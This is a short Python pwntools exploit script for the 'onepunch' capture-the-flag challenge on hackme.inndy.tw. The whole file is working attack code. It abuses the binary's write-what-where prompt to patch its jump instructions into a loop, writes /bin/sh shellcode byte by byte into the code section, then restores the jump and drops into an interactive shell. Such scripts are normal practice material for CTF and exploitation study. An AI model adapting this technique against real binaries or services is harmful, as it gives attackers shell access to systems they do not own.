#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os, base64, math, time
context(arch = "amd64",os = "linux", log_level = "debug")


p = remote("hackme.inndy.tw", 7718)
# p = process('./onepunch')
elf = ELF('./onepunch')
gdb_command =   """
                b *0x400767
                """
# gdb.attach(p, gdb_command)
time.sleep(1)

p.recvuntil("Where What?")
# Change 0x400767: jnz short loc_400778 to jnz short loc_40071D
p.sendline("400768 180")
p.recvuntil("Where What?")
# Change 0x400767: jnz short loc_40071D to jmp short loc_40071D
p.sendline("400767 235")

# Write Shellcode
shellcode = asm(shellcraft.sh())
code_base = 0x400769
for c in shellcode:
    p.recvuntil("Where What?")
    p.sendline("%s %d" % (hex(code_base), ord(c)))
    code_base += 1

p.recvuntil("Where What?")
# Change 0x400767: jmp short loc_40071D to jnz short loc_40071D
p.sendline("400767 117")
p.recvuntil("Where What?")
# Exit Loop
p.sendline("601061 255")
p.interactive()